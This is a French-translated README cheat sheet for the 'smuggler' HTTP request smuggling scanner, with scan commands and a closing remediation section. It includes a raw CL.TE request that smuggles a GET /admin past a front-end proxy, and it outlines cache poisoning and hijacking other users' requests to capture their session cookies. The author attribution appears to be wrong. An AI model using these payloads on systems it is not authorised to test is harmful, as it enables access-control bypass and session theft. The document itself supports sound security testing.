<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 📦 contrebandier - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ███████╗██████╗ 
  ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██╔════╝██╔══██╗
  ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     █████╗  ██████╔╝
  ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██╔══╝  ██╔══██╗
  ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗███████╗██║  ██║
  ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
             High-Performance HTTP Request Smuggling Scanner
```
<p align="center">
  <img src="https://img.shields.io/badge/smuggler-HTTP_Smuggling-blue?style=for-the-badge" alt="smuggler">
  <img src="https://img.shields.io/badge/Author-Evan_Ricaurte-orange?style=for-the-badge" alt="defparam">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Sécurité Web">
  <img src="https://img.shields.io/badge/License-MIT-purple?style=for-the-badge" alt="MIT">
</p>

<p align="center">
  <b>📦 Outil Python ultra-rapide et modulaire conçu pour détecter et vérifier les vulnérabilités de contrebande de requêtes HTTP (CL.TE, TE.CL et désynchronisations de mutation d'en-tête) dans l'infrastructure Web moderne</b>
</p>

---

## 📋 Table des matières

- [Vue d'ensemble et théorie de la contrebande HTTP](#-overview--http-smuggling-theory)
  - [Écarts CL.TE vs TE.CL](#clte-vs-tecl-discrepancies)
- [Installation](#-installation)
- [Analyse cible de base](#-basic-target-scanning)
- [Configurations d'analyse et moteurs de mutation](#-scan-configurations--mutation-engines)
  - [Analyse par défaut ou exhaustive] (#analyse par défaut ou exhaustive)
  - [En-têtes personnalisés et cookies](#custom-headers--cookies)
- [Analyse multi-cibles et pipeline] (#-multi-target--pipeline-scanning)
- [Analyse des résultats et des chemins d'exploitation](#-analyse-results--exploitation-paths)
  - [Empoisonnement du cache via la contrebande](#cache-poisoning-via-smuggling)
  - [Contourner les contrôles de sécurité front-end](#bypassing-front-end-security-controls)
  - [Détournement des demandes d'autres utilisateurs](#hijacking-other-users-requests)
- [Tableau de référence rapide](#-quick-reference-table)
- [Considérations défensives et mesures correctives](#-considérations-défensives--remédiation)
- [Mentions légales](#-legal-disclaimer)

---

## 🎯 Présentation et théorie de la contrebande HTTP

La contrebande de requêtes HTTP se produit lorsqu'un proxy/équilibreur de charge frontal et un serveur Web principal ne sont pas d'accord sur les limites d'une requête HTTP :

### Écarts CL.TE vs TE.CL
- **CL.TE :** Le front-end utilise `Content-Length`, le back-end utilise `Transfer-Encoding: chunked`.
- **TE.CL :** Le front-end utilise `Transfer-Encoding: chunked`, le back-end utilise `Content-Length`.
- **TE.TE :** Les deux prennent en charge `Transfer-Encoding`, mais on peut être amené à l'ignorer via un obscurcissement de l'en-tête (par exemple, `Transfer-Encoding: xchunked`, des tabulations ou un pliage de ligne).

Créé par **defparam (Evan Ricaurte)**, **smuggler** injecte des charges utiles soigneusement conçues pour observer les retards de synchronisation ou les réponses de désynchronisation sans rompre la stabilité du service backend.

---

## 📥Installation
```bash
# Clone the repository
git clone https://github.com/defparam/smuggler.git
cd smuggler

# Run using Python 3
python3 smuggler.py -h
```
---

## 🚀 Analyse de cible de base

Analyser un seul point de terminaison d'application Web :
```bash
# Basic scan against a single target
python3 smuggler.py -u https://target.com/
```
Par défaut, le contrebandier teste les comportements `CL.TE` et `TE.CL` à l'aide de charges utiles de synchronisation sécurisée.

---

## ⚙️ Configurations d'analyse et moteurs de mutation

### Analyse par défaut ou analyse exhaustive
Smuggler comprend différents profils de charge utile :
- **Profil par défaut :** Mutations de désynchronisation rapides et courantes.
- **Profil exhaustif :** Mutations complètes testant les variations d'espaces, les en-têtes multiples et les en-têtes de codage de transfert obscurcis :
```bash
# Run exhaustive scan testing all mutation gadgets
python3 smuggler.py -u https://target.com/ -c exhaustive
```
### En-têtes personnalisés et cookies
Lorsqu'une authentification ou des en-têtes d'hôte spécifiques sont requis :
```bash
python3 smuggler.py -u https://target.com/api/ \
  -H "Cookie: session=xyz123" \
  -H "X-Forwarded-Host: target.com"
```
---

## 🌐 Analyse multi-cibles et pipeline

Acheminez les points de terminaison découverts à partir de `httpx` ou `subfinder` directement vers le contrebandier :
```bash
# Scan a list of URLs from file
python3 smuggler.py -f live_hosts.txt -t 10

# Adjust timeout per probe (default: 10s)
python3 smuggler.py -u https://target.com/ --timeout 5
```
---

## 💥 Analyse des résultats et des pistes d'exploitation

Lorsque le passeur signale une correspondance positive :
```text
[CRITICAL] CL.TE Desync Detected: https://target.com/
```
### Empoisonnement du cache via la contrebande
Faites passer clandestinement une requête qui génère une redirection hors site (par exemple, manipulation de l'en-tête de l'hôte) pour empoisonner les caches Web servant les bibliothèques JavaScript à tous les utilisateurs.

### Contourner les contrôles de sécurité front-end
Si le proxy frontal bloque `/admin`, faites passer clandestinement une requête interne secondaire qui atteint directement le back-end sans inspection du proxy :
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 48
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
```
### Détournement des demandes d'autres utilisateurs
Faire passer clandestinement un préfixe d'une requête HTTP. Lorsque l'utilisateur suivant envoie sa demande, celle-ci est ajoutée à votre demande clandestine, exposant ainsi ses cookies et ses jetons de session.

---

## ⚡ Tableau de référence rapide

| Objectif | Commande |
|-----------|---------|
| **Cible unique rapide** | `python3 smuggler.py -u https://target.com/` |
| **Analyse approfondie exhaustive**| `python3 smuggler.py -u https://target.com/ -c exhaustive` |
| **Liste des cibles de numérisation** | `python3 smuggler.py -f targets.txt -t 15` |
| **En-têtes/Cookies personnalisés**| `python3 smuggler.py -u <URL> -H "Cookie: sess=123"` |
| **Délai d'expiration personnalisé** | `python3 smuggler.py -u <URL> --timeout 15` |

---

## 🛡️ Considérations défensives et mesures correctives

1. **Appliquer HTTP/2 ou HTTP/3 de bout en bout :** HTTP/2 définit des longueurs de trame sans ambiguïté, éliminant ainsi toute ambiguïté d'en-tête.
2. **Normaliser les en-têtes HTTP :** Configurez les proxys inverses pour rejeter les requêtes contenant à la fois `Content-Length` et `Transfer-Encoding`.
3. **Supprimez les mutations ambiguës :** Supprimez les requêtes avec des en-têtes `Transfer-Encoding` obscurcis (par exemple, des espaces avant les deux points, des valeurs multiples).

---

## ⚠️ Mentions légales

> [!ATTENTION]
> La contrebande de requêtes HTTP peut perturber les files d'attente backend en direct et empoisonner les nœuds de mise en cache partagés. smuggler doit être utilisé exclusivement sur des cibles de test explicitement autorisées avec la stricte autorisation des propriétaires d’actifs.